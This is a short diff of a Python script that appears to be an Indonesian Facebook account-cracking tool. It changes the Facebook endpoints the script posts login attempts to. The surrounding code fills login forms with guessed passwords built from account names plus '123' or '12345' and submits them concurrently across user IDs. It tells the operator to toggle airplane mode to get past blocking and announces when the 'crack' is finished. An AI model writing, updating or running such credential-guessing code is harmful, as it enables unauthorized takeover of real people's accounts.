@@ -443,7 +443,7 @@ def cek_opsi(user,pw):
 	for x in soup("input"):
 		data.update({x.get("name"):x.get("value")})
 	data.update({"email":user,"pass":pw})
-	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
+	urlPost=session.post("https://www.facebook.com"+link.get("action"),data=data)
 	response=parser(urlPost.text, "html.parser")
 	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
 		print("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
@@ -711,7 +711,7 @@ def sandiotomatis():
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
 				else:
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
-				fall.submit(mfbasic, uid, pwx,"https://b-api.facebook.com")
+				fall.submit(mfbasic, uid, pwx,"https://m.facebook.com")
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 		
 ### BAGIAN CRACK ###
